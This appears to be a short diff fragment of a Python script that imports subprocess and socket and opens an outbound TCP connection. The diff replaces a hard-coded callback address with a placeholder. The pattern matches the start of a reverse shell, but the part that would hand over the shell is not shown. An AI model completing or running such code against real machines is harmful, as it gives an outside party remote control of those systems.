@@ -1,7 +1,7 @@
 import subprocess, socket
 
-ip = "54.67.99.78"
-port = 10088
+ip = "1.2.3.4"
+port = 80
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((ip, port))
 
